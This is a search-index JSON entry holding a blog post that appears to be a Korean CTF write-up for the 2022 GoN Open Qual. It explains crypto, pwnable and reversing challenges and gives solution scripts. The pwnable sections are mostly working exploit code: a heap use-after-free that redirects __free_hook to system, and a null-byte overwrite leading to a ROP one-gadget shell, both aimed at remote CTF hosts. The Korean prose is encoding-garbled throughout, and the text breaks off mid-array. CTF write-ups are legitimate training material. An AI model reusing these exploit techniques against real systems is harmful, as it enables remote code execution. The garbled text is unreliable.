[ { "title": "2022 Spring GoN Open Qual Writeup", "url": "/posts/2022-Spring-GoN-Open-Qual-Writeup/", "categories": "Writeup", "tags": "writeup, GoN, Dreamhack, CTF", "date": "2022-03-23 15:00:00 +0900", "snippet": "GoNì—ì„œ ë“œë¦¼í•µì— CTFë¥¼ ì—´ì—ˆë‹¤.í¬ê²Œ í•  ì¼ë„ ì—†ì—ˆê³ , ì¬ë°ŒëŠ” ë¬¸ì œë„ ë§ì•„ ë³´ì´ëŠ” ë°ë‹¤ê°€ ìƒìœ„ 3ëª…ì—ê² ì¹˜í‚¨ë„ ì¤€ëŒ€ì„œ ê½¤ ì—´ì‹¬íˆ ì°¸ì—¬í–ˆë‹¤.ëŒ€íšŒëŠ” 2ìœ„ë¡œ ë§ˆë¬´ë¦¬ í–ˆê³ , ì¬ë°Œê²Œ í’€ì—ˆë˜ ë¬¸ì œë“¤ì´ ë§ì•„ì„œ í’€ì´ë¥¼ í•´ë³´ë ¤ê³  í•œë‹¤.A. CS448 - Cryptoìš´ì¢‹ê²Œ í¼ë¸”ë”´ ë¬¸ì œì´ë‹¤.ëŒ€ì¶© ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ encryptí•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì„œ í”Œë˜ê·¸ë¥¼ ì•”í˜¸í™”í•´ì„œ ì‚¬ìš©ìì—ê²Œ ì „ë‹¬í•œë‹¤.def encrypt(s, k): res = &quot;&quot; if k &amp;lt;= len(s): _print(&quot;[!] key shold be larger then len(pt) for safty!!&quot;) return &quot;&quot; for i, c in enumerate(s): enc = (get_random_u8() + key * i) % 0xff enc = ord(c) ^ enc res += hex(enc)[2:].rjust(2, &quot;0&quot;) return resì™„ì „í•œ ëœë¤ ê°’ì„ ì´ìš©í•´ì„œ xorì„ í•˜ëŠ” ê²ƒ ê°™ì§€ë§Œ ì˜ ë³´ë©´ &amp;amp; 0xFFê°€ ì•„ë‹Œ % 0xFFë¥¼ í†µí•´ì„œ í‚¤ë¥¼ byteí¬ê¸°ë¡œ ë§ì¶˜ë‹¤.ë•Œë¬¸ì— xorí•˜ëŠ” keyì˜ ê°’ì´ ì ˆëŒ€ë¡œ 255ê°€ ë  ìˆ˜ ì—†ê³  ë”°ë¼ì„œ ë¬´í•œìœ¼ë¡œ ìš”ì²­ì„ ë‚ ë¦¬ë©´ì„œ (ëëë‚´ ë‚˜ì˜¤ì§€ ì•ŠëŠ” í•˜ë‚˜ì˜ ê°’) ^ 255ë¥¼ í•˜ë©´ í”Œë˜ê·¸ì˜ ê° ë°”ì´íŠ¸ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.ê·¸ë¦¬ê³  ë§ˆì¹¨ ì´ë²ˆ í•´í‚¹ìº í”„ì— ëƒˆë˜ ë¬¸ì œì™€ ì»¨ì…‰ì´ ê²¹ì³ì„œ poc ì½”ë“œë¥¼ ì¡°ê¸ˆ ìˆ˜ì •í•´ì„œ í’€ì´í•˜ì˜€ë‹¤. Solution Scriptfrom pwn import *# p = process([&#39;python&#39;,&#39;-u&#39;,&#39;./chall.py&#39;])p = remote(&quot;wargame.goatskin.kr&quot;, 42917)# context.log_level= 0key_set = set(list(range(255)))rand_set = set(list(range(256)))my_key = list(rand_set - key_set)[0]p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;,&#39;3&#39;)p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;,&#39;255&#39;)p.recvuntil(b&#39;: &#39;) flag_len = len(p.recvline())//2flag_set = [list(range(256)) for _ in range(flag_len)]flag = [&#39; &#39; for _ in range(flag_len)]count = 0while sum([len(i) for i in flag_set]) &amp;gt; flag_len: p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;,&#39;3&#39;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;,&#39;255&#39;) p.recvuntil(b&#39;: &#39;) enc = bytes.fromhex(p.recvline().strip().decode()) for i in range(flag_len): if flag_set[i].count(enc[i]) == 1: flag_set[i].pop(flag_set[i].index(enc[i])) if len(flag_set[i]) == 1: flag[i] = chr(flag_set[i][-1] ^ my_key) print(&#39;&#39;.join(flag)) print(&#39; &#39;.join([str(len(i)) for i in flag_set])) count += 1print(count)print(&#39;&#39;.join(flag))B. Oxidized - PwnableRust í¬ë„ˆë¸” ë¬¸ì œì´ë‹¤.ì •í™•í•˜ì§€ ì•Šì€ ì •ë³´ì´ì§€ë§Œ, ì˜ˆì „ì— ì–¼í• ë“£ê¸°ë¡œëŠ” ëŸ¬ìŠ¤íŠ¸ê°€ BOF ê°™ì€ low level ì·¨ì•½ì ìœ¼ë¡œë¶€í„° Cì–¸ì–´ë³´ë‹¤ ì•ˆì „í•˜ë„ë¡ ë§Œë“¤ì–´ì¡Œë‹¤ê³  ë“¤ì–´ì„œ ì‹ ê¸°í•œ ì»¨ì…‰ì´ë¼ê³  ëŠê»´ì¡Œë‹¤.ë¬¸ì œì˜ ê°€ì¥ í° ì·¨ì•½ì ì€ UAFì˜€ë‹¤.íŠ¹ì • í¬ê¸°ì˜ tcacheë¥¼ ê½‰ ì±„ìš°ê³  tcacheì— ë“¤ì–´ê°€ì§€ ì•ŠëŠ” í° í¬ê¸°ì˜ ê³µê°„ì„ í• ë‹¹í•˜ì—¬ UAFë¥¼ í†µí•´ libcì˜ ì£¼ì†Œë¥¼ ì–»ì—ˆë‹¤.ë˜, freeëœnodeì— ì ë‹¹íˆ ì•„ë‹¤ë¦¬ë¥¼ ë§ì¶”ë©´ì„œ updateë¥¼ í•  ë•Œì‚¬ì´ì¦ˆë¥¼ 0ìœ¼ë¡œ ì£¼ê²Œ ë˜ë©´ ë˜ ë‹¤ë¥¸ freeëœ ê³µê°„ì˜ nodeì— writeë¥¼ í•  ìˆ˜ ìˆëŠ” ë²„ê·¸ê°€ ì¡´ì¬í•˜ì˜€ë‹¤.ì´ë¥¼ ì´ìš©í•´ì„œ íŠ¹ì • ë…¸ë“œë¥¼ ì•„ë‹¤ë¦¬ê°€ ë§ê²Œ ì´ë¦„ì„ ì ë‹¹íˆ ì„¤ì •í•˜ê³ í•´ë‹¹ ë…¸ë“œì˜ í¬ì¸í„°ë¥¼ __free_hookìœ¼ë¡œ ë³€í™˜í•œ ë’¤ì— is_stringì„ falseê°’ìœ¼ë¡œ ì½ì–´ì§€ë„ë¡ ë…¸ë“œë¥¼ ìˆ˜ì •í•˜ì˜€ë‹¤.ì´ë•Œ, ìœ„ ê³¼ì •ì„ ì •í™•í•˜ê²Œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ëª‡ ì‹œê°„ì˜ ë™ì ë””ë²„ê¹… ëì— ì˜¤í”„ì…‹ì„ ëª¨ë‘ ë½‘ì•˜ë‹¤ ã… ë˜, updateí•˜ëŠ” ê³¼ì •ì—ì„œ __free_hook ì£¼ì†Œë¥¼ ì…ë ¥í•  ë•Œ read_strë¥¼ í˜¸ì¶œí•˜ê²Œ ë˜ëŠ”ë°ì´ë•Œ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ UTF-8ì— validí•˜ì§€ ì•Šì€ ì¸í’‹ì´ ë“¤ì–´ì˜¤ë©´ í”„ë¡œì„¸ìŠ¤ê°€ ì£½ì–´ë²„ë¦¬ëŠ” í˜„ìƒì´ ìˆì—ˆë‹¤.ì´ ë•Œë¬¸ì— __free_hook ì£¼ì†Œì˜ ëª¨ë“  ë°”ì´íŠ¸ê°€ 0x80ë³´ë‹¤ ì‘ì€ì§€ ê²€ì‚¬í•˜ê³  ì•„ë‹ˆë©´ ë‹¤ì‹œ ì—°ê²°í•˜ëŠ” ì¡°ê±´ì„ ì¶”ê°€í–ˆë‹¤.ë‹¨ìˆœ ê³„ì‚°ìœ¼ë¡œ ì•½ 1/16 ì •ë„ì˜ í™•ë¥ ì´ë¯€ë¡œ ì¡°ê±´ì„ ë§ì¶”ê¸°ëŠ” ì–´ë µì§€ ì•Šì•˜ìœ¼ë‚˜ë¦¬ëª¨íŠ¸ í™˜ê²½ì—ì„œ í•œ ë²ˆ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ì‹œ ì—°ê²°í•  ìˆ˜ ì—†ì–´ì„œ ì ‘ì† í•œ ë²ˆ í•  ë•Œë§ˆë‹¤ vmì„ ë‹¤ì‹œ ìš”ì²­í•´ì•¼í–ˆë‹¤â€¦+ ëŒ€íšŒê°€ ëë‚œ í›„ì— ì¶œì œì writeupì„ ë´¤ì„ ë• UTF-8 ë¬¸ì œê°€ ì—†ì–´ë³´ì—¬ì„œ ë‚˜ì¤‘ì— í•œ ë²ˆ ì´ìœ ë¥¼ ì•Œì•„ë³´ê¸°ë¡œ í–ˆë‹¤.ì´í›„, ë®ì–´ ì”Œì›Œì§„ ë…¸ë“œë¥¼ updateí•´ì„œ __free_hookì˜ ê°’ì„ system ì£¼ì†Œë¡œ ìˆ˜ì •í–ˆê³ /bin/sh\\x00ì„ í•˜ë‚˜ ë§Œë“¤ê³  ì‚­ì œí•´ì„œ ì‰˜ì„ íœ™ë“í•˜ì˜€ë‹¤.ì•„ë‹¤ë¦¬ë§Œ ë§ìœ¼ë©´ ê·¸ëŒ€ë¡œ ëŒë¦¬ê³  ê°€ì ¸ê°€ì„œ ì½”ë“œê°€ ì¢€ ì§€ì €ë¶„í•˜ë‹¤ Exploit Scriptfrom http import cookiesfrom pwn import *import requestsREMOTE=1e = ELF(&#39;./chal_patched&#39;)libc = ELF(&#39;./libc-2.27.so&#39;)def insert(key,value,size=None): if LOGGING: if size is not None:log.info(f&quot;insert({key=}, {value=}, {size=})&quot;) else:log.info(f&quot;insert({key=}, {value=})&quot;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;1&#39;) p.sendlineafter(b&#39;key &amp;gt;&amp;gt; &#39;, str(key).encode()) if isinstance(value, bytes): assert size is not None p.sendlineafter(b&#39;is it String? (Y/N) &amp;gt;&amp;gt; &#39;, b&#39;Y&#39;) p.sendlineafter(b&#39;size &amp;gt;&amp;gt; &#39;, str(size).encode()) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, value) else: p.sendlineafter(b&#39;is it String? (Y/N) &amp;gt;&amp;gt; &#39;, b&#39;N&#39;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, str(value).encode())def search(key): if LOGGING:log.info(f&quot;search({key=})&quot;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;2&#39;) p.sendlineafter(b&#39;key &amp;gt;&amp;gt; &#39;, str(key).encode()) def update(key, value, size=None): if LOGGING:log.info(f&quot;update({key=}, {value=}, {size=})&quot;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;3&#39;) p.sendlineafter(b&#39;key &amp;gt;&amp;gt; &#39;, str(key).encode()) if isinstance(value, bytes): assert size is not None p.sendlineafter(b&#39;size &amp;gt;&amp;gt; &#39;, str(size).encode()) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, value) else: p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, str(value).encode())def delete(key): if LOGGING:log.info(f&quot;delete({key=})&quot;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;4&#39;) p.sendlineafter(b&#39;key &amp;gt;&amp;gt; &#39;, str(key).encode())def viewall(): if LOGGING:log.info(f&quot;viewall()&quot;) p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;5&#39;)while 1: try: LOGGING= False if REMOTE: pause() x = requests.get(&quot;https://dreamhack.io/api/v1/ctf/ctfs/24/challenges/177/vms/&quot;, cookies=&quot;&quot;&quot;ë‚´ ì¿ í‚¤&quot;&quot;&quot;).json()[0] # ë¹ ë¥´ê²Œ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ê¸° ìœ„í•œ ì½”ë“œ ã…ã…;; host = x[&#39;host&#39;] port = x[&#39;port_mappings&#39;][0][1] print(host, port) p = remote(host, port) LOGGING = True # if REMOTE:p = remote(&#39;192.168.2.1&#39;,13100) else:p = e.process(aslr=True) for i in range(7): insert(i + 0x60, str(i+1).encode(),0x60) for i in range(7): delete(i + 0x60) insert(0x70, b&#39;DEADBEEF&#39;,0x420) insert(0xD0, 0xcafebabe) viewall() libc.address = base = int(p.recvuntil(b&#39;1. Insert item&#39;,drop=True).splitlines()[6].split()[0]) - 0x3ebcb0 log.success(f&#39;LIBC: {hex(base)}&#39;) viewall() if REMOTE:heap = int(p.recvuntil(b&#39;1. Insert item&#39;,drop=True).splitlines()[2].split()[0]) - 21088 else:heap = int(p.recvuntil(b&#39;1. Insert item&#39;,drop=True).splitlines()[2].split()[0]) - 21344 log.success(f&#39;HEAP: {hex(heap)}&#39;) target = 0x5468 + heap if REMOTE:target-=0x100 print(target) viewall() victim = 0x70 print(hex(victim)) print(p64(target)) if any(i&amp;gt;=0x80 for i in p64(target)): p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;,b&#39;6&#39;) assert 0 pause() LOGGING = True update(victim, b&#39;\\x60&#39;*8+p64(target), 0) writer = int(b&#39;60&#39;*8,16) update(writer, libc.symbols[&#39;__free_hook&#39;]) update(0xD0, libc.symbols[&#39;system&#39;]) insert(1,b&#39;/bin/sh\\x00&#39;,0x10) delete(1) p.interactive() except EOFError: p.close() continue except AssertionError: p.close() continueC. RUN - Reversingë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ ì•„ì£¼ ê¹”ë”í•˜ê²Œ ì¸ì½”ë”© ë£¨í‹´ë§Œ ì¡´ì¬í•œë‹¤.ì¸ì½”ë”© ë£¨í‹´ì€ í¬ê²Œ ë³µì¡í•˜ì§€ ì•Šì•˜ê³  ì•„ë˜ì™€ ê°™ì•˜ë‹¤. ì¸í’‹ íŒŒì¼ì˜ ëª¨ë“  ë¹„íŠ¸ë¥¼ char[]ì— ì €ì¥í•œë‹¤. í•´ë‹¹ ë°°ì—´ì„ ì²˜ìŒë¶€í„° ëŒë©´ì„œ 0ì´ ë‚˜ì˜¤ë©´ ë°˜ë³µë˜ëŠ” 0ì˜ ìˆ˜ë¥¼ ì„¼ë‹¤. ë°˜ë³µë˜ëŠ” 0ì˜ ìˆ˜ì˜ ê°’ì„ cë¼ê³  í–ˆì„ ë•Œ, cì˜ ë¹„íŠ¸ ìˆ˜ ë§Œí¼ 1ì„ output ë²„í¼ì— ì¶”ê°€í•œë‹¤. cë¥¼ little-endianìœ¼ë¡œ output ë²„í¼ì— ì¶”ê°€í•œë‹¤. ë§Œì•½ 1ì´ ë‚˜ì˜¤ë©´ output ë²„í¼ì— 00ì„ ì¶”ê°€í•œë‹¤. ë°°ì—´ì´ ëë‚œ í›„ì—”, output ë²„í¼ì˜ ê°’ì„ ì˜¨ì „í•œ ë°”ì´íŠ¸ë¡œ ì „í™˜í•˜ê¸° ìœ„í•´ 1ë¡œ íŒ¨ë”©ì„ í•´ì¤€ë‹¤. {input file name}.enc íŒŒì¼ì— ë²„í¼ë¥¼ ì¶œë ¥í•œë‹¤.ì´ì²˜ëŸ¼ ë‹¨ìˆœí•œ ë¹„íŠ¸ ì••ì¶• ë°©ì‹ìœ¼ë¡œ ì¸ì½”ë”©ì´ ë˜ì–´ìˆìœ¼ë¯€ë¡œ ê°„ë‹¨í•œ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì—¬ í’€ì´í•˜ì˜€ë‹¤.ê·¸ëŸ°ë° ì•„ì£¼ ì‚¬ì†Œí•œ ì‹¤ìˆ˜ë¥¼ ë°œê²¬í•˜ì§€ ëª»í•´ì„œ í‘¸ëŠ” ë°ì— ìƒê°ë³´ë‹¤ ì‹œê°„ì„ ì¢€ ë§ì´ ì¼ì—ˆë‹¤. Solution Scriptwith open(&quot;flag.enc&quot;, &quot;rb&quot;) as f: f.read(8) t= f.read()b = &#39;&#39;.join(bin(i)[2:].zfill(8)[::-1] or &quot;little-endian -&amp;gt; big-endian&quot; for i in t)g = &#39;&#39;i = 0c = 0while i &amp;lt; len(b): c = 0 try: while b[i + c] == &#39;1&#39;:c += 1 except:break assert(b[i + c] == &#39;0&#39;) c += 1 r = &#39;&#39; for j in range(c): r = b[i + c + j] + r assert(b[i+c+j] == &#39;1&#39; or c == 1),(b[i+c+j], c, b[i+c:i+c+c], b[i:i+c], g) g += &#39;0&#39; * int(r, 2) + &#39;1&#39; i += c * 2print(len(g)&amp;amp;7)r = [int(g[i:i+8][::-1] or &quot;big-endian -&amp;gt; little-endian&quot;, 2) for i in range(0, len(g), 8)]print(bytes(r)[:16])with open(&#39;x&#39;, &#39;wb&#39;) as f: f.write(bytes(r))D. Nonsense - Reversingí¬ì§€ ì•Šì€ ë°”ì´ë„ˆë¦¬ë¥¼ ê°€ì§„ ë¦¬ë²„ì‹± ë¬¸ì œì˜€ë‹¤.ëŒ€ì¶© ìš”ì•½í•˜ë©´, argv[1]ìœ¼ë¡œ ê¸¸ì´ê°€ 48ì¸ ì¸í’‹ì„ ë°›ê³  2ë°”ì´íŠ¸ì”© ìª¼ê°œì„œ ì•Œ ìˆ˜ ì—†ëŠ” ì—°ì‚°ì„ í•œ í›„ì— í…Œì´ë¸”ì˜ ê°’ê³¼ ë¹„êµë¥¼ í•˜ëŠ” ë°”ì´ë„ˆë¦¬ì´ë‹¤.í•˜ì§€ë§Œ ê·¸ ì•Œ ìˆ˜ ì—†ëŠ” ì—°ì‚°ì€ ëŒ€ì¶© ë´¤ì„ ë•Œ, ì§€ì˜¥ ë¶ˆêµ¬ë©ì´ì˜ ìš©ì•” ê°™ì€ ì—´ì •ë„ ë‹¹ì¥ ë² ìŠ¤í‚¨ë¼ë¹ˆìŠ¤ ì•„ì´ìŠ¤í¬ë¦¼ì´ ë˜ë„ë¡ ìƒê²¨ ë¨¹ì–´ì„œ ë¶„ì„í•˜ê³  ì‹¶ì§€ ì•Šì•˜ë”°.ì´ ë–„ë¬¸ì—, í•´ë‹¹ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” í•¨ìˆ˜ì— 2 byteì”© ëŒ€ì…í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ì–»ê¸°ë¡œ í•˜ì˜€ê³ ì•µê±°ë¥¼ ì‚¬ìš©í•˜ë©´ ì¢‹ì•˜ê² ì§€ë§Œ, ì“¸ ì¤„ ëª°ë¼ì„œ gdb scriptë¥¼ í†µí•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. Solution Script#!gdb nonsense -ximport gdba,b = 0x20, 0x20r = [[] for _ in range(24)]class bpa(gdb.Breakpoint): def stop(self): global a, b # print(a,b) gdb.execute(f&quot;set $rdi={(a &amp;lt;&amp;lt; 8) | b}&quot;) return Falset= [0x00000000AB1FF171, 0x00000000116437CE, 0x00000000E6049FC0, 0x00000000452929D1, 0x0000000075A447EB, 0x00000000C9E8CDA8, 0x000000001CDB0144, 0x00000000F6D4EA9C, 0x000000001CDB0144, 0x00000000C64319B3, 0x00000000F2D03C54, 0x00000000CABE6234, 0x000000001195A6AB, 0x00000000DC8A5604, 0x00000000A7DC071B, 0x000000003ED216D4, 0x00000000D05424C0, 0x000000001A13D5D9, 0x00000000E8A2E464, 0x000000008469B42D, 0x00000000F6D4EA9C, 0x00000000452929D1, 0x00000000BAEBBCB0, 0x00000000EBB57056]r= [None for _ in (t)]class bpb(gdb.Breakpoint): def stop(self): global a, b, r try: x = int(gdb.execute(&quot;p $rax&quot;,to_string=True).split(&quot;=&quot;)[1].strip()) &amp;amp; 0xFFFFFFFFFFFFFFFF if x in t: print(x, a, b) i = 0 while 1: try:r[(i := t.index(x, i) + 1) - 1] = chr(b)+chr(a) except:break except gdb.MemoryError: print(hex(x), a, b) if (b := b + 1) == 0x7f: print(a) if (a := a + 1) == 0x7f: print(r) print(&#39;&#39;.join(r)) gdb.execute(&quot;q&quot;) b = 0x20 gdb.execute(&quot;set $rip=0x555555400B78&quot;) return Falsegdb.execute(&quot;file nonsense&quot;)gdb.execute(&quot;aslr off&quot;)bpa(&quot;* 0x555555400B7A&quot;)bpb(&quot;* 0x555555400b7f&quot;)gdb.execute(&quot;r asdfasdfasdfsadfasdfasdfasdfsadfasdfasdfasdfsadf&quot;)E. NullNull - Pwnableë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ê°€ ìˆë‹¤.int sub_13BD(){ __int64 v1; // [rsp-50h] [rbp-50h] if ( __isoc99_scanf(&quot;%80s&quot;, &amp;amp;v1) != 1 ) _exit(1); return puts(&amp;amp;v1);}ì•ˆì „í•˜ê²Œ ì…ë ¥ ë°›ì€ ë¬¸ìì—´ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥í•´ì£¼ëŠ” ê²ƒ ê°™ì§€ë§Œ, scanfì˜ %së¡œ ì…ë ¥ì„ ë°›ê¸° ë•Œë¬¸ì—v1[ì…ë ¥ë°›ì€ ë¬¸ìì—´ì˜ ê¸¸ì´]ì— 0ì´ ë“¤ì–´ê°€ê²Œ ë˜ì–´ì„œ sfpì˜ ìµœí•˜ìœ„ ë°”ì´íŠ¸ë¥¼ 0ìœ¼ë¡œ ë®ì„ ìˆ˜ê°€ ìˆë‹¤.ë•Œë¬¸ì—, rbpì˜ ê°’ì´ ë¹„ì •ìƒì ìœ¼ë¡œ ë³€í•˜ê²Œ ë˜ê³ , í•¨ìˆ˜ì˜ ë¦¬í„´ì´ ì—°ì†ìœ¼ë¡œ 2íšŒ ì¼ì–´ë‚˜ê²Œ ë˜ë©´ ripê°€ ì˜ë„ë˜ì§€ ì•Šì€ ê³³ìœ¼ë¡œ ì´ë™í•œë‹¤.ë˜í•œ, sub_13BDì˜ ìƒìœ„ í•¨ìˆ˜ì˜ ë³€ìˆ˜ë“¤ì€ rbpë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì°¸ì¡°ë˜ê¸° ë•Œë¬¸ì—ìŠ¤íƒì˜ 8bytes read write ì¸ë±ìŠ¤ë¥¼ ì œí•œí•˜ëŠ” ê¸°ì¡´ì˜ 32ë¼ëŠ” ê°’ì´ ì €ì¥ëœ ìŠ¤íƒì˜ ì£¼ì†Œê°€ ì•„ë‹ˆë¼ë³€ì¡°ëœ rbpë¥¼ í†µí•´ ë‹¤ë¥¸ ì£¼ì†Œì˜ ê°’ì„ ì°¸ì¡°í•˜ê²Œ í•˜ë©´ì„œ ìŠ¤íƒì˜ read write ê³¼ì •ì—ì„œ oobê°€ ë°œìƒí•˜ê²Œ ëœë‹¤.ë”°ë¼ì„œ ì˜¬ë°”ë¥´ê²Œ ì‘ë™í•˜ëŠ” ê²½ìš°ì˜ ìˆ˜ í•˜ë‚˜ë¥¼ ì´ìš©í•˜ì—¬ ROPë¥¼ í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ ì§œê³ ì•„ë‹¤ë¦¬ê°€ ë§ì„ ë•Œê¹Œì§€ ì—°ê²°í•˜ë©´ ì‰˜ì„ ì–»ì„ ìˆ˜ ìˆë‹¤. Exploit Scriptfrom pwn import *import structe = ELF(&#39;./nullnull_patched&#39;)libc = e.libcdef read(idx): log.info(f&#39;read({idx=})&#39;) p.sendline(b&#39;3&#39;) p.sendline(str(idx).encode())def write(idx, val): log.info(f&#39;write({idx=}, {val=})&#39;) p.sendline(b&#39;2&#39;) p.sendline(str(idx).encode()) p.sendline(str(val).encode())def echo(val): log.info(f&#39;echo({val=})&#39;) p.sendline(b&#39;1&#39;) p.sendline(val)def re(): log.info(f&#39;re()&#39;) p.sendline(b&#39;0&#39;)def out(): log.info(f&#39;out()&#39;) p.sendline(b&#39;-1&#39;)while 1: # p = e.process() p= remote(&#39;host1.dreamhack.games&#39;, 14359) echo(b&#39;1&#39;*80) p.recvline() read(37) try:base = int(struct.pack(&quot;&amp;gt;q&quot;,int(p.recvline())).hex(),16) except EOFError: p.close() continue if base==0: p.close() continue base -= libc.symbols[&#39;__libc_start_main&#39;] + 0xf3 if base&amp;amp;0xFF!=0: p.close() continue print(hex(base)) rdx_r12 = 0x0000000000119241 + base rsi = 0x000000000002604f + base oneshot = 0xe3d29 + base write(3, rdx_r12) write(4, 0) write(5, 0) write(6, rsi) write(7, 0) write(8, oneshot) re() p.interactive() breakF. Unconventional - Reversingraxì™€ rspì˜ ì—­í• ì´ ë°”ë€ í‰í–‰ì„¸ê³„ì˜ ë°”ì´ë„ˆë¦¬ë¥¼ ì»¨ì…‰ìœ¼ë¡œ í•œ ë¬¸ì œì´ë‹¤.raxë¥¼ í†µí•´ push, popí•˜ëŠ” ê³¼ì •ê³¼ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê³¼ì •ì´ ì–¼í• ìƒê°í•˜ë©´ ë‹¹ì—°í•˜ì§€ë§Œ ì°¸ì‹ í•˜ê³  ì¬ë¯¸ìˆê²Œ ëŠê»´ì¡Œë‹¤.ì¼ë‹¨ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ë³´ë©´ í¬ê¸°ê°€ í¬ì§€ ì•Šê¸° ë•Œë¬¸ì—ì–´ë µì§€ ì•Šê²Œ ì–´ë– í•œ ë£¨í‹´ì„ ê°–ê³  ë™ì‘í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.fgetsë¥¼ í†µí•´ ê¸¸ì´ê°€ 48ì¸ ì…ë ¥ì„ ë°›ê³ , ì…ë ¥ì„ ê¸¸ì´ê°€ 16ì¸ ë¸”ë¡ìœ¼ë¡œ ìª¼ê°œì„œ ì—°ì‚°í•œë‹¤.ì—°ì‚°ì€ xë¼ê³  ì„ì˜ë¡œ ì •ì˜í•œ [0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C] ê°’ê³¼ í•¨ê»˜ ì§„í–‰ëœë‹¤.ê° ë¸”ë¡ë³„ë¡œ 0xC0FF33ë²ˆ ì—°ì‚°ì„ ë°˜ë³µí•˜ëŠ”ë°, ì—°ì‚°ì˜ ê³¼ì •ì€ ì•„ë˜ì™€ ê°™ì•˜ë‹¤. ë¸”ëŸ­ì„ ARIAì˜ 2ë²ˆì§¸ sboxë¡œ substitute ë¸”ëŸ­ì„ AES ë°©ì‹ìœ¼ë¡œ shift row [0x03, 0x0C, 0x0B, 0x05, 0x08, 0x04, 0x07, 0x0D, 0x0F, 0x00, 0x06, 0x0E, 0x09, 0x01, 0x0A, 0x02]ì„ ì´ìš©í•˜ì—¬ ë¸”ëŸ­ì—ë‹¤ê°€ xor, add, rol xì™€ ë¸”ë¡ì„ xor xì—ë‹¤ê°€ 1 ~ 3 ì—°ì‚°ì´ë¥¼ ëŒ€ì¶© íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¡œ ë³€í™˜í•˜ë©´ ì•„ë˜ì™€ ê°™ì•˜ë‹¤.from tqdm import tqdm # progress barx = [0x21, 0xE5, 0x88, 0xAC, 0xBB, 0xB0, 0x97, 0xEA, 0x16, 0x42, 0x03, 0x0B, 0x9B, 0xD2, 0x5C, 0x6C]comp = [0x89, 0xB4, 0xF7, 0x8F, 0xE1, 0x8B, 0x29, 0x0D, 0x37, 0xB1, 0x56, 0xC0, 0xF0, 0x75, 0x42, 0x8E, 0x1C, 0xC4, 0x2D, 0x1D, 0xD9, 0x2E, 0xD4, 0x83, 0x55, 0xEE, 0x6B, 0xAD, 0x53, 0x40, 0x79, 0x65, 0x07, 0x9A, 0x0A, 0xB2, 0x9F, 0x82, 0x99, 0x10, 0xDF, 0x45, 0x22, 0x6B, 0x50, 0xDB, 0x0B, 0x40]sbox = [0xE2, 0x4E, 0x54, 0xFC, 0x94, 0xC2, 0x4A, 0xCC, 0x62, 0x0D, 0x6A, 0x46, 0x3C, 0x4D, 0x8B, 0xD1, 0x5E, 0xFA, 0x64, 0xCB, 0xB4, 0x97, 0xBE, 0x2B, 0xBC, 0x77, 0x2E, 0x03, 0xD3, 0x19, 0x59, 0xC1, 0x1D, 0x06, 0x41, 0x6B, 0x55, 0xF0, 0x99, 0x69, 0xEA, 0x9C, 0x18, 0xAE, 0x63, 0xDF, 0xE7, 0xBB, 0x00, 0x73, 0x66, 0xFB, 0x96, 0x4C, 0x85, 0xE4, 0x3A, 0x09, 0x45, 0xAA, 0x0F, 0xEE, 0x10, 0xEB, 0x2D, 0x7F, 0xF4, 0x29, 0xAC, 0xCF, 0xAD, 0x91, 0x8D, 0x78, 0xC8, 0x95, 0xF9, 0x2F, 0xCE, 0xCD, 0x08, 0x7A, 0x88, 0x38, 0x5C, 0x83, 0x2A, 0x28, 0x47, 0xDB, 0xB8, 0xC7, 0x93, 0xA4, 0x12, 0x53, 0xFF, 0x87, 0x0E, 0x31, 0x36, 0x21, 0x58, 0x48, 0x01, 0x8E, 0x37, 0x74, 0x32, 0xCA, 0xE9, 0xB1, 0xB7, 0xAB, 0x0C, 0xD7, 0xC4, 0x56, 0x42, 0x26, 0x07, 0x98, 0x60, 0xD9, 0xB6, 0xB9, 0x11, 0x40, 0xEC, 0x20, 0x8C, 0xBD, 0xA0, 0xC9, 0x84, 0x04, 0x49, 0x23, 0xF1, 0x4F, 0x50, 0x1F, 0x13, 0xDC, 0xD8, 0xC0, 0x9E, 0x57, 0xE3, 0xC3, 0x7B, 0x65, 0x3B, 0x02, 0x8F, 0x3E, 0xE8, 0x25, 0x92, 0xE5, 0x15, 0xDD, 0xFD, 0x17, 0xA9, 0xBF, 